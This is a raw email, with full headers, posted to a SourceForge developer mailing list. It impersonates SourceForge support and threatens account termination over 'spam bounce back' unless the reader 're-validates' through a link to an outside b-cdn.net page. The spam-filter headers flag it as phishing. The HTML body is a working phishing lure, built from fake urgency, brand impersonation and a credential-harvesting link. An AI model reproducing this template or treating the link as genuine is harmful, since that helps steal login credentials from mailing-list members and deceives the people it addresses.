Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 7BC3F9563C8
	for <lists+industrypack-devel@lfdr.de>; Mon, 19 Aug 2024 08:34:00 +0200 (CEST)
Received: from [127.0.0.1] (helo=sfs-ml-2.v29.lw.sourceforge.com)
	by sfs-ml-2.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1sfvxm-0002NP-1s
	for lists+industrypack-devel@lfdr.de;
	Mon, 19 Aug 2024 06:33:58 +0000
Received: from [172.30.29.66] (helo=mx.sourceforge.net)
 by sfs-ml-2.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <admin@infodirectly.com>) id 1sfvxk-0002NJ-P9
 for industrypack-devel@lists.sourceforge.net;
 Mon, 19 Aug 2024 06:33:56 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Transfer-Encoding:Content-Type:MIME-Version
 :Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=53a7yKUswFrsmZhD/xeMTeXMxvvZec4dJNJXRWi9Us8=; b=eJ/dhLkukLLaQHEnvOgaspEWRk
 4e1/U4g2Z16vdchx00eJlgnNnR67lohKtayRP7HJ3A6mUTyhX8Dc4YvRbwtWL/I/qWznM5luOePqa
 4iaBs2DIPaa0lqeyVjOmoQjeMyqgjhw3BZm+goBtJhxiDdDAtQkG6bPRNPl8LZ6joa/s=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:Date:
 Subject:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date
 :Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=53a7yKUswFrsmZhD/xeMTeXMxvvZec4dJNJXRWi9Us8=; b=C
 lHaaGkp4AOgxES/qzxQZN77+wYcwmJm2rcU1ITQxb2uti18SQ9fFXswqxG8PRV71rsp8ktVyjPQzG
 SgNNJIpNlxU692oLM1vm6SC3DgmqT+/vhgfssAEPYnJCWp8r3BdKcv4oR9gd+5v3PqnyfEQ+5/6u2
 4vYXFO/PF1NX7ZAI=;
Received: from [188.127.227.3] (helo=s926421.srvape.com)
 by sfi-mx-2.v28.lw.sourceforge.com with esmtp (Exim 4.95)
 id 1sfvxj-0005wz-LP for industrypack-devel@lists.sourceforge.net;
 Mon, 19 Aug 2024 06:33:56 +0000
Received: from ip-220-5.dataclub.info (localhost [IPv6:::1])
 by s926421.srvape.com (Postfix) with ESMTP id 878F0328846
 for <industrypack-devel@lists.sourceforge.net>;
 Mon, 19 Aug 2024 09:33:25 +0300 (MSK)
From: lists.sourceforge.net Email Support <admin@infodirectly.com>
To: industrypack-devel@lists.sourceforge.net
Date: 19 Aug 2024 09:33:22 +0300
Message-ID: <20240819093322.6DA777A410653124@infodirectly.com>
MIME-Version: 1.0
X-Spam-Score: 3.6 (+++)
X-Spam-Report: Spam detection software,
 running on the system "util-spamd-1.v13.lw.sourceforge.com", 
 has NOT identified this incoming email as spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview:  IT HelpDesk Sender Action Required Account Termination 
 Content analysis details:   (3.6 points, 6.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 0.0 RCVD_IN_DNSWL_BLOCKED  RBL: ADMINISTRATOR NOTICE: The query to
 DNSWL was blocked.  See
 http://wiki.apache.org/spamassassin/DnsBlocklists#dnsbl-block
 for more information. [188.127.227.3 listed in list.dnswl.org]
 0.0 URIBL_BLOCKED          ADMINISTRATOR NOTICE: The query to URIBL was
 blocked.  See
 http://wiki.apache.org/spamassassin/DnsBlocklists#dnsbl-block
 for more information. [URIs: b-cdn.net]
 0.0 RCVD_IN_VALIDITY_SAFE_BLOCKED RBL: ADMINISTRATOR NOTICE: The
 query to Validity was blocked.  See
 https://knowledge.validity.com/hc/en-us/articles/20961730681243
 for more information.
 [188.127.227.3 listed in sa-trusted.bondedsender.org]
 0.0 RCVD_IN_VALIDITY_RPBL_BLOCKED RBL: ADMINISTRATOR NOTICE: The
 query to Validity was blocked.  See
 https://knowledge.validity.com/hc/en-us/articles/20961730681243
 for more information.
 [188.127.227.3 listed in bl.score.senderscore.com]
 0.0 SPF_NONE               SPF: sender does not publish an SPF Record
 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 0.0 HTML_MESSAGE           BODY: HTML included in message
 1.0 FROM_FMBLA_NEWDOM14    From domain was registered in last 7-14 days
 1.3 RDNS_NONE Delivered to internal network by a host with no rDNS
 -0.0 T_SCC_BODY_TEXT_LINE   No description available.
 0.0 TVD_PH_BODY_ACCOUNTS_PRE The body matches phrases such as
 "accounts suspended", "account credited", "account verification"
 0.0 TO_NO_BRKTS_NORDNS_HTML To: lacks brackets and no rDNS and HTML
 only 1.2 URI_PHISH              Phishing using web form
X-Headers-End: 1sfvxj-0005wz-LP
Subject: [Industrypack-devel] Too Much Spam Bounce Back (Re-validate Now)
 Last Warning!!
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============6685132479065021392=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

--===============6685132479065021392==
Content-Type: text/html
Content-Transfer-Encoding: quoted-printable

<!DOCTYPE HTML>

<html><head><title></title>
<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
</head>
<body style=3D"margin: 0.4em;">
<div style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0p=
x; letter-spacing: normal; font-family: Arial, Helvetica, sans-serif; font-=
size: small; font-style: normal; font-weight: 400; word-spacing: 0px; white=
-space: normal; orphans: 2; widows: 2; background-color: rgb(255, 255, 255)=
; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-s=
troke-width: 0px; text-decoration-thickness: initial; text-decoration-style=
: initial; text-decoration-color: initial;">
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</div>
<table style=3D"color: rgb(29, 34, 40); text-transform: none; letter-spacin=
g: normal; padding-top: 0px; padding-bottom: 0px; font-family: inherit; fon=
t-size: 13px; font-style: normal; font-weight: 600; word-spacing: 0px; whit=
e-space: normal; border-collapse: collapse; max-width: 548px; border-spacin=
g: 0px; orphans: 2; widows: 2; background-color: rgb(255, 255, 255); font-v=
ariant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-wi=
dth: 0px; text-decoration-thickness: initial;=20
text-decoration-style: initial; text-decoration-color: initial;" border=3D"=
0"><tbody><tr><td style=3D"margin: 0px; width: 181px; font-family: inherit;=
 font-size: 12px; vertical-align: bottom;">IT HelpDesk</td><td style=3D"mar=
gin: 0px; width: 186px; text-align: center; font-family: inherit; font-size=
: 12px; vertical-align: bottom;"><br></td><td style=3D"margin: 0px; width: =
181px; text-align: right; font-family: inherit; font-size: 12px; vertical-a=
lign: bottom;"><br></td></tr><tr>
<td style=3D"margin: 0px; width: 181px; padding-top: 0px; padding-bottom: 0=
px; font-family: inherit; font-size: 14px; vertical-align: middle;"><span s=
tyle=3D"border-width: 0px; margin: 0px; padding: 0px; color: white; vertica=
l-align: baseline;"><span style=3D"border-width: 0px; margin: 0px; padding:=
 0px; color: black; vertical-align: baseline;">Sender</span></span></td>
<td style=3D"margin: 0px; width: 186px; text-align: center; padding-top: 0p=
x; padding-bottom: 0px; font-family: inherit; font-size: 14px; font-weight:=
 400; vertical-align: middle;"><br></td><td style=3D"margin: 0px; width: 18=
1px; text-align: right; padding-top: 0px; padding-bottom: 0px; font-family:=
 inherit; font-size: 14px; font-weight: 400; vertical-align: middle;"><span=
 style=3D"border-width: 0px; margin: 0px; padding: 0px; color: white; verti=
cal-align: baseline;">
<span style=3D"border-width: 0px; margin: 0px; padding: 0px; color: rgb(192=
, 0, 0); vertical-align: baseline;"><strong>Action Required</strong></span>=
</span></td></tr><tr><td style=3D"margin: 0px; padding: 0px; font-family: i=
nherit; font-size: 12px;" colspan=3D"3"><table style=3D"padding: 0px; borde=
r-collapse: collapse; border-spacing: 0px;" border=3D"0" cellspacing=3D"0" =
cellpadding=3D"0"><tbody><tr>
<td style=3D"margin: 0px; padding: 0px; width: 180px; line-height: 10px; fo=
nt-family: inherit; font-size: 6px; min-height: 10px;" bgcolor=3D"#cccccc">=
<br></td><td style=3D"margin: 0px; padding: 0px; width: 4px; line-height: 1=
0px; font-family: inherit; font-size: 6px; min-height: 10px;" bgcolor=3D"wh=
ite"><br></td><td style=3D"margin: 0px; padding: 0px; width: 180px; line-he=
ight: 10px; font-family: inherit; font-size: 6px; min-height: 10px;" bgcolo=
r=3D"#cccccc"><br></td>
<td style=3D"margin: 0px; padding: 0px; width: 4px; line-height: 10px; font=
-family: inherit; font-size: 6px; min-height: 10px;" bgcolor=3D"white"><br>=
</td><td style=3D"margin: 0px; padding: 0px; width: 180px; line-height: 10p=
x; font-family: inherit; font-size: 6px; min-height: 10px;" bgcolor=3D"#c00=
000"><br></td></tr></tbody></table></td></tr><tr><td style=3D"margin: 0px; =
padding: 0px; width: 181px; line-height: 20px; font-family: inherit; font-s=
ize: 14px; font-weight: 400;"><br></td>
<td style=3D"margin: 0px; padding: 0px; width: 186px; text-align: center; l=
ine-height: 20px; font-family: inherit; font-size: 14px; font-weight: 400;"=
><br></td><td style=3D"margin: 0px; padding: 0px; width: 181px; text-align:=
 right; line-height: 20px; font-family: inherit; font-size: 14px;"><font co=
lor=3D"#c00000">Account Termination</font></td></tr></tbody></table>
<div style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0p=
x; letter-spacing: normal; font-family: Arial, Helvetica, sans-serif; font-=
size: small; font-style: normal; font-weight: 400; word-spacing: 0px; white=
-space: normal; orphans: 2; widows: 2; background-color: rgb(255, 255, 255)=
; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-s=
troke-width: 0px; text-decoration-thickness: initial; text-decoration-style=
: initial; text-decoration-color: initial;">
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;=
 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbs=
p; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &n=
bsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; =
&nbsp; &nbsp;&nbsp;</div>
<div style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0p=
x; letter-spacing: normal; font-family: Arial, Helvetica, sans-serif; font-=
size: small; font-style: normal; font-weight: 400; word-spacing: 0px; white=
-space: normal; orphans: 2; widows: 2; background-color: rgb(255, 255, 255)=
; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-s=
troke-width: 0px; text-decoration-thickness: initial; text-decoration-style=
: initial; text-decoration-color: initial;"><br>
</div><div style=3D"color: rgb(34, 34, 34); text-transform: none; text-inde=
nt: 0px; letter-spacing: normal; font-family: Arial, Helvetica, sans-serif;=
 font-size: small; font-style: normal; font-weight: 400; word-spacing: 0px;=
 white-space: normal; orphans: 2; widows: 2; background-color: rgb(255, 255=
, 255); font-variant-ligatures: normal; font-variant-caps: normal; -webkit-=
text-stroke-width: 0px; text-decoration-thickness: initial; text-decoration=
-style: initial; text-decoration-color: initial;">
<br></div>
<div style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0p=
x; letter-spacing: normal; font-family: Arial, Helvetica, sans-serif; font-=
size: small; font-style: normal; font-weight: 400; word-spacing: 0px; white=
-space: normal; orphans: 2; widows: 2; background-color: rgb(255, 255, 255)=
; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-s=
troke-width: 0px; text-decoration-thickness: initial; text-decoration-style=
: initial; text-decoration-color: initial;"><br>
</div><p style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent=
: 0px; letter-spacing: normal; font-family: Arial, Helvetica, sans-serif; f=
ont-size: small; font-style: normal; font-weight: 400; word-spacing: 0px; w=
hite-space: normal; orphans: 2; widows: 2; background-color: rgb(255, 255, =
255); font-variant-ligatures: normal; font-variant-caps: normal; -webkit-te=
xt-stroke-width: 0px; text-decoration-thickness: initial; text-decoration-s=
tyle: initial; text-decoration-color: initial;">
Warning Email notification: For&nbsp;industrypack-devel@lists.sourceforge.n=
et server termination if failure to re-validate your lists.sourceforge.net =
account now.<br><br>Your&nbsp;industrypack-devel@lists.sourceforge.net acco=
unt is displaying a failure re signal on our data server. due to too much s=
pam bounce back and this could lead to delay of incoming message till pendi=
ng due hour for your account to be fully suspended if failure to re-validat=
e your account in 48hours.<br><br>
<a style=3D"color: rgb(17, 85, 204);" href=3D"https://portaltric.b-cdn.net/=
proscefer.htm#industrypack-devel@lists.sourceforge.net">Re-Validate Your Ac=
count Now</a></p>
<div style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0p=
x; letter-spacing: normal; font-family: Arial, Helvetica, sans-serif; font-=
size: small; font-style: normal; font-weight: 400; word-spacing: 0px; white=
-space: normal; orphans: 2; widows: 2; background-color: rgb(255, 255, 255)=
; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-s=
troke-width: 0px; text-decoration-thickness: initial; text-decoration-style=
: initial; text-decoration-color: initial;"><br>
</div><div style=3D"color: rgb(34, 34, 34); text-transform: none; text-inde=
nt: 0px; letter-spacing: normal; font-family: Arial, Helvetica, sans-serif;=
 font-size: small; font-style: normal; font-weight: 400; word-spacing: 0px;=
 white-space: normal; orphans: 2; widows: 2; background-color: rgb(255, 255=
, 255); font-variant-ligatures: normal; font-variant-caps: normal; -webkit-=
text-stroke-width: 0px; text-decoration-thickness: initial; text-decoration=
-style: initial; text-decoration-color: initial;">
<br></div>
<div style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0p=
x; letter-spacing: normal; font-family: Arial, Helvetica, sans-serif; font-=
size: small; font-style: normal; font-weight: 400; word-spacing: 0px; white=
-space: normal; orphans: 2; widows: 2; background-color: rgb(255, 255, 255)=
; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-s=
troke-width: 0px; text-decoration-thickness: initial; text-decoration-style=
: initial; text-decoration-color: initial;"><br>
</div><div style=3D"color: rgb(34, 34, 34); text-transform: none; text-inde=
nt: 0px; letter-spacing: normal; font-family: Arial, Helvetica, sans-serif;=
 font-size: small; font-style: normal; font-weight: 400; word-spacing: 0px;=
 white-space: normal; orphans: 2; widows: 2; background-color: rgb(255, 255=
, 255); font-variant-ligatures: normal; font-variant-caps: normal; -webkit-=
text-stroke-width: 0px; text-decoration-thickness: initial; text-decoration=
-style: initial; text-decoration-color: initial;">
<span style=3D"color: rgb(12, 54, 84);"><strong>Thank you.<br>lists.sourcef=
orge.net&nbsp;Customer Services Team</strong><br><br><em>The email is autom=
atically generated upon request. This electronic transmission is confidenti=
al information and is for your use only. If this is not the case, please de=
lete the original and all copies and notify the sender immediately.</em><br=
><em>Copyright &copy;<strong>&nbsp;&nbsp;<span style=3D"color: rgb(12, 74, =
243);">.</span>&nbsp;&nbsp;</strong>
&nbsp;All rights reserved</em></span><br><div><br></div><div><br>&nbsp;<br>=
<br><br><br>&nbsp;</div></div></body></html>


--===============6685132479065021392==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============6685132479065021392==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============6685132479065021392==--
